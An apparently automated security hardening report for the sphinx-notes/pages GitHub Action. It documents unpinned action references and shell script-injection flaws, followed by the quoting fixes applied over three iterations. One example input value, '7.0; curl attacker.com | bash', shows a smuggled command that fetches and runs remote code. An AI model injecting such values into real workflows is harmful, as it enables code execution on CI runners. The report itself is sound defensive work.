<!-- markdownlint-disable -->

# Hardening Report: sphinx-notes--pages/3.4

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **sphinx-notes--pages/3.4** was hardened automatically. 2 finding(s) were identified and resolved across 3 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

All 9 `uses:` references in action.yml are pinned to mutable tags or branch names instead of immutable 40-character SHA digests. This exposes the action to supply-chain attacks if any upstream action is compromised or its tag is moved. Failing references:
- `actions/checkout@v4` (appears twice)
- `actions/setup-python@v5` (appears twice)
- `actions/cache@v4`
- `sphinx-doc/github-problem-matcher@master` (branch name — highest risk)
- `actions/configure-pages@v4`
- `actions/upload-pages-artifact@v3`
- `actions/deploy-pages@v4`

All should be replaced with their full 40-character commit SHA, e.g. `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4`.

Locations:

- `action.yml:53`
- `action.yml:56`
- `action.yml:59`
- `action.yml:63`
- `action.yml:68`
- `action.yml:73`
- `action.yml:84`
- `action.yml:96`
- `action.yml:101`

### script-injection (severity: high)

Sub-rule (a): The `run:` block directly interpolates `${{ github.action_path }}` inside the shell command string: `run: ${{ github.action_path }}/main.sh`. Any `${{ ... }}` expression inside a `run:` block is substituted by the YAML template engine before the shell ever sees it, bypassing shell quoting. Although `github.action_path` is not directly attacker-controlled, this pattern is a script-injection finding per the check rules — the value flows through YAML template substitution unsanitized.

Sub-rule (b): In `main.sh`, several environment variables sourced from `inputs.*` (workflow-controllable) are expanded **unquoted** in shell commands, allowing an attacker to inject shell metacharacters:
- Line ~24: `pip3 install -U sphinx==$INPUT_SPHINX_VERSION` — `$INPUT_SPHINX_VERSION` is unquoted; an attacker can supply a value like `7.0; curl attacker.com | bash`.
- Line ~37: `pip3 install .[$INPUT_PYPROJECT_EXTRAS]` — `$INPUT_PYPROJECT_EXTRAS` is unquoted.
- Line ~79: `sphinx-build -b html $INPUT_SPHINX_BUILD_OPTIONS "$doc_dir" "$build_dir"` — `$INPUT_SPHINX_BUILD_OPTIONS` is unquoted, allowing word-splitting and glob expansion of attacker-supplied content.

All three variables must be double-quoted: `"$INPUT_SPHINX_VERSION"`, `"$INPUT_PYPROJECT_EXTRAS"`, `"$INPUT_SPHINX_BUILD_OPTIONS"`.

Locations:

- `action.yml:73`
- `main.sh:24`
- `main.sh:37`
- `main.sh:79`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection

**Notes:**

Fixed all 9 unpinned `uses:` references in action.yml by pinning each to its full 40-character commit SHA (with tag preserved as a comment). Fixed script-injection issues: moved `${{ github.action_path }}` to an `ACTION_PATH` env var so the run: field no longer contains a template expression; double-quoted `$INPUT_SPHINX_VERSION` and `$INPUT_PYPROJECT_EXTRAS` in main.sh; and replaced the unquoted `$INPUT_SPHINX_BUILD_OPTIONS` expansion with a safe xargs-based array tokenization pattern that preserves argument boundaries while preventing shell injection.

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Fixed all four script injection issues in main.sh:
1. Line 8: Quoted repo_dir and doc_dir assignments: `repo_dir="$GITHUB_WORKSPACE/$INPUT_REPOSITORY_PATH"` and `doc_dir="$repo_dir/$INPUT_DOCUMENTATION_PATH"` to prevent word splitting and glob expansion.
2. Line 28: Used `printf 'sphinx==%s' "$INPUT_SPHINX_VERSION"` to safely construct the pip package specifier, storing in $sphinx_pkg and passing as `"$sphinx_pkg"` — the %s format treats the value as pure data.
3. Line 50: Used `printf '.[%s]' "$INPUT_PYPROJECT_EXTRAS"` similarly for the pyproject extras specifier.
4. Line 74: Quoted both the executable and argument: `"$git_restore_mtime" "$repo_dir"` to prevent word splitting and glob expansion on user-controlled path data.

### Iteration 3

**Fixes applied:** script-injection

**Notes:**

Fixed three unquoted variable expansions in hardened/action/main.sh:
1. Line 40: `echo ::group:: Installing dependencies declared by $INPUT_REQUIREMENTS_PATH` → `echo ::group:: Installing dependencies declared by "$INPUT_REQUIREMENTS_PATH"`
2. Line 42: `echo No $INPUT_REQUIREMENTS_PATH found, skipped` → `echo No "$INPUT_REQUIREMENTS_PATH" found, skipped`
3. Line 47: `echo ::group:: Installing dependencies declared by pyproject.toml[$INPUT_PYPROJECT_EXTRAS]` → `echo ::group:: Installing dependencies declared by "pyproject.toml[$INPUT_PYPROJECT_EXTRAS]"`

The `[...]` bracket expression on line 47 was particularly dangerous as it could form a glob pattern that the shell would attempt to expand. All three variables are now properly double-quoted to prevent word splitting and glob expansion on attacker-controlled input values.

